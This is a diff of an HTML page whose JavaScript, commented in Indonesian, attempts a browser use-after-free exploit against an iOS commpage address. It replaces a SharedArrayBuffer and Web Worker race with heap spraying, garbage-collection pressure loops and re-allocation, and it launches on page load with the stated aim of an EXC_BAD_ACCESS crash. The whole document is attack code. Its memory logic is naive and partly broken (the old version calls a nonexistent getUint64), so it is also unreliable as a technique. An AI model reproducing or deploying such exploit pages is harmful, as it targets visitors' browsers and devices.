@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Extreme SAB Race Condition Attack</title>
+    <title>Aggressive Mono-Thread UAF Timing</title>
 </head>
 <body>
 
-    <h1>Extreme Race Condition UAF (Targeting Commpage Address)</h1>
+    <h1>UAF Timing Attack (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Siap Memulai Eksploitasi Multi-Thread...</p>
+    <p id="status">INIT: Siap Memulai Eksploitasi Timing...</p>
     <div id="log"></div>
 
     <script>
@@ -19,91 +19,90 @@
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
-        let victimObj = null; // Objek yang akan menjadi korban UAF
-        let worker = null;    // Web Worker untuk Race Condition
+        let victimObj = null; 
+        let payloadHolders = []; // Untuk menjaga agar payload tidak di-GC
 
         function log(message) {
             document.getElementById('log').innerHTML += '<div>' + message + '</div>';
         }
 
-        // FUNGSI UTAMA: URUTAN SERANGAN
-        function startAttack() {
-            log("Phase 1: Mempersiapkan Objek Korban dan SAB.");
-            
-            // 1. Alokasi Korban (Victim Allocation)
-            // Objek yang memiliki lifetime kompleks, seperti objek DOM atau Buffer
-            victimObj = new ArrayBuffer(512); 
-            let view = new DataView(victimObj);
-            view.setUint32(0, 0x1A2B3C4D, true); // Masukkan pola unik untuk identifikasi
+        // --- FUNGSI HEAP SPRAY PAYLOAD ---
+        function sprayPayload() {
+            const SPRAY_COUNT = 1000;
+            const PAYLOAD_SIZE = 64; // Ukuran disesuaikan dengan objek yang kita free
 
-            // 2. Persiapan Shared Buffer dan Worker
-            const sharedBuffer = new SharedArrayBuffer(1024);
-            const statusArray = new Int32Array(sharedBuffer); // Untuk sinkronisasi status
-            
-            // Kirim status dan data Commpage ke Worker
-            worker = new Worker('worker.js');
-            worker.postMessage({ 
-                cmd: 'start', 
-                sharedBuffer: sharedBuffer,
-                payloadLow: LOW_WORD,
-                payloadHigh: HIGH_WORD
-            });
-
-            // 3. Pemicu Race dan UAF (The Critical Race)
-            log("Phase 2: Memulai Race Condition. Mencoba Free/Re-Allocate...");
-            
-            // Coba panggil fungsi yang memicu Garbage Collection secara agresif
-            // Sambil Worker terus-menerus melakukan Spraying (di worker.js)
-            for(let i = 0; i < 50; i++) {
-                // Hapus referensi victimObj secara cepat, berharap GC me-free memori
-                victimObj = null; 
+            for (let i = 0; i < SPRAY_COUNT; i++) {
+                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                 
-                // Alokasikan banyak array kecil untuk membantu memicu GC (optional)
-                for(let j = 0; j < 1000; j++) {
-                     let filler = new Array(Math.random() * 5 + 1); 
-                }
+                // Isi array dengan nilai Commpage Target Address
+                payloadArray[0] = HIGH_WORD; 
+                payloadArray[1] = LOW_WORD;
+                payloadArray[2] = 1234.567; 
+                
+                payloadHolders.push(payloadArray); 
             }
+            log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
+        }
+
+        // --- FUNGSI EKSEKUSI UTAMA ---
+        function runUAFSequence() {
+            log("Phase 1: Mengalokasikan Objek Korban.");
+            // 1. Alokasi Korban (ArrayBuffer adalah target umum)
+            victimObj = new ArrayBuffer(512); 
+            let victimView = new DataView(victimObj);
+            victimView.setUint32(0, 0xAAAAAAAA, true); // Pola unik korban
             
-            // 4. Trigger Eksploitasi
-            log("Phase 3: Mencoba Trigger UAF pada lokasi memori korban.");
+            // 2. Menciptakan Lubang Memori (FREE)
+            // Hapus referensi agar ArrayBuffer siap di-GC/free
+            victimObj = null; 
+            victimView = null;
+            log("Phase 2: Referensi korban dihapus (Siap di-FREE).");
             
-            // Dapatkan kembali referensi korban (yang kini ditimpa oleh spray Worker)
-            // Ini adalah bagian tersulit karena kita harus menebak kapan memori di-re-allocate
-            // Untuk percobaan, kita akan mencoba membuat objek yang ukurannya sama.
+            // 3. Memicu GC dan Mengisi Lubang (RACE CONDITION)
+            // Kita harus menciptakan alokasi memori yang sangat besar dan cepat (Inline Spray)
+            // untuk memaksa GC bekerja dan kemudian menimpa lubang tersebut.
             
+            // Loop yang intensif untuk memakan waktu dan memaksa GC
+            for (let i = 0; i < 50000; i++) {
+                 // Alokasikan objek cepat di loop
+                 let tempArr = new Array(10).fill(i);
+            }
+            log("Phase 3: Loop intensif selesai. Memberikan waktu GC.");
+
+            // 4. Re-Allocate (Melakukan Spray Payload Tepat Setelah GC)
+            sprayPayload();
+            
+            // 5. Memicu Trigger Eksploitasi
+            log("Phase 4: Mencoba Trigger UAF Dereference...");
+            
+            // Kita perlu membuat objek baru yang menempati lokasi ArrayBuffer lama.
+            // Coba alokasikan lagi ArrayBuffer dengan ukuran yang sama, berharap mendapat lokasi yang ditimpa.
             let attackerView = new DataView(new ArrayBuffer(512));
             
-            // Anggaplah di sini attackerView kini menempati lokasi lama victimObj.
-            // Kita coba dereferensi (membaca) nilai yang seharusnya menjadi pointer valid.
-            
             try {
-                // Operasi yang akan membaca pointer dari lokasi yang ditimpa oleh TARGET_CONTROL_ADDRESS
-                // Ini akan memuat TARGET_CONTROL_ADDRESS ke register.
-                const crashValue = attackerView.getUint64(0, true); 
+                // Akses data 64-bit pada lokasi yang seharusnya kini berisi TARGET_CONTROL_ADDRESS
+                const crashValue = attackerView.getBigInt64(0, true); 
                 
-                // Jika tidak crash, kita coba trigger crash yang lebih langsung
-                // Dengan asumsi crashValue kini adalah alamat Commpage
-                log("Nilai dari memori yang ditimpa: " + crashValue.toString(16));
+                log(`Nilai yang dibaca dari lokasi ditimpa: 0x${crashValue.toString(16)}`);
                 
-                // Operasi yang mencoba menggunakan nilai yang ditimpa sebagai pointer (sering menyebabkan crash)
-                // Misalnya, mencoba mengakses properti objek yang "pointer"-nya adalah TARGET_CONTROL_ADDRESS
-                let crashObj = {};
-                crashObj[crashValue] = 1; // JIT mungkin mencoba menggunakan crashValue sebagai key hash, memicu register load
-                
+                // Memicu crash dengan menggunakan nilai yang dibaca sebagai pointer/objek
+                let crashTest = {};
+                // Memaksa JIT menggunakan nilai yang dibaca dari memori
+                crashTest[crashValue] = 1; 
+
             } catch(e) {
+                // Tetap log error JS, tetapi tunggu Segfault OS
                 log("JS Error: " + e.message + " - Menunggu Segfault OS.");
             }
-
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Periksa Log secara Berkala.';
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-             // Cek kompatibilitas SAB (tidak selalu diizinkan di iOS)
-             if (typeof SharedArrayBuffer === 'undefined') {
-                 document.getElementById('status').textContent = 'Gagal: SharedArrayBuffer tidak didukung di sini.';
-                 return;
-             }
-             startAttack();
+            document.getElementById('status').textContent = 'Memulai rangkaian UAF Timing...';
+            
+            // Jadwalkan eksekusi utama agar sistem bisa inisialisasi
+            setTimeout(runUAFSequence, 50);
+            
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah EXC_BAD_ACCESS.';
         });
 
     </script>
